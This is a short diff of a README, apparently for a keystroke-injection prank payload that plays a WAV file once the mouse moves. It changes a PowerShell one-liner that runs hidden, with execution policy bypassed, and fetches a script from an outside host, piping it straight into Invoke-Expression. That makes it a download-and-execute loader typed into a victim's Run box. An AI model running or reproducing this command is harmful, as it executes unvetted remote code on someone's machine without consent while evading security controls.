@@ -39,7 +39,7 @@ After a mouse movement is detected, the WAV file will be played.
 * Invoke-WebRequest will be entered in the Run Box to download your WAV file
  
 ```
-powershell -w h -NoP -NonI -Ep Bypass $wav='';iwr https://jakoby.lol/vus | iex
+powershell -w h -NoP -NonI -Ep Bypass $wav='';irm https://jakoby.lol/vus | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
